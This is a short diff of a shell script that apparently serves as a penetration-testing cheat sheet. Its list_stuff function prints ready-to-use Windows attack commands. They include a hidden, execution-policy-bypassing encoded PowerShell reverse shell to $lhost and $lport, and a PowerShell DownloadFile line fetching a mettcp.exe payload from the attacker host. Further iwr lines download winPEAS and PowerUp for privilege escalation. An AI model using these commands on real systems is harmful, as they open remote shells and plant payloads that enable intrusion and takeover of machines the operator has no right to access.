@@ -98,7 +98,7 @@ list_stuff() {
         python3 /home/$USER/auto/scripts/genps_quiet.py $lhost $lport
         echo ""
     fi
-    if $1; then
+    if $1; then # just for testing, remove if you want
         echo -n "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand "; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport"
         echo ""
     fi
@@ -134,7 +134,7 @@ list_stuff() {
     echo -e "${BB}WINDOWS PRIVILEGE ESCALATION${W}"
     echo -e "${LG}==============================================${W}"
     echo -e "${R}>${W} if you only have a cmd.exe shell then use below instead (mettcp.exe example)"
-    echo -e "${R}>${W} powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.8.91.46/payloads/mettcp.exe','mettcp.exe')"
+    echo -e "${R}>${W} powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://$lhost/payloads/mettcp.exe','mettcp.exe')"
     echo ""
     echo -e "iwr -uri http://$lhost/enum/win/winPEASx64.exe -OutFile ${G}winpeas.exe${W}"
     echo -e "iwr -uri http://$lhost/enum/win/PowerUp.ps1 -OutFile ${G}PowerUp.ps1${W}"
